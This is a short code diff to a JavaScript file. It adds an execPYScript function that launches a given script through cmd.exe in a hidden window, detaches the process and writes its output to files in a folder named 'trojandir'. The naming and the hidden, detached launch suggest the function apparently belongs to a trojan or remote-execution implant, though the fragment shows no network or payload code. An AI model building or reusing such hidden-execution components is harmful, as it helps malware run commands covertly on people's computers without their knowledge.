@@ -1279,8 +1279,43 @@ function execJSScript() {
 
 }
 
-function execPYScript() {
+// TODO needs path to python exe
+function execPYScript(scriptfpath, cmdlineargsarr) {
+    logmsg('starting');
 
+    let tmpcode = getRandomCode(8);
+    let stdoutfpath = path.join(systemstate.trojandir, 'execCMDScript_' + tmpcode + '.out');
+    let stderrfpath = path.join(systemstate.trojandir, 'execCMDScript_' + tmpcode + '.err');
+
+    const out = fs.openSync(stdoutfpath, 'a');
+    const err = fs.openSync(stderrfpath, 'a');
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg('spawning process: '+scriptfpath+' cmdlineargsarr: '+cmdlineargsarr.join());
+
+
+    const child = spawn('cmd.exe', ['/c', scriptfpath, ...(cmdlineargsarr ?? [])], { 
+        // detached: true, // might cause errors
+        windowsHide: true,
+        stdio: [ 'ignore', out, err ],
+        shell: false,
+        cwd: systemstate.trojandir 
+    });
+
+    child.unref();
+
+    let tchildproc = getProcess(child.pid);
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+
+    logmsg('finished');
+
+    return child;
 }
 
 function execCMDScript(scriptfpath, cmdlineargsarr) {
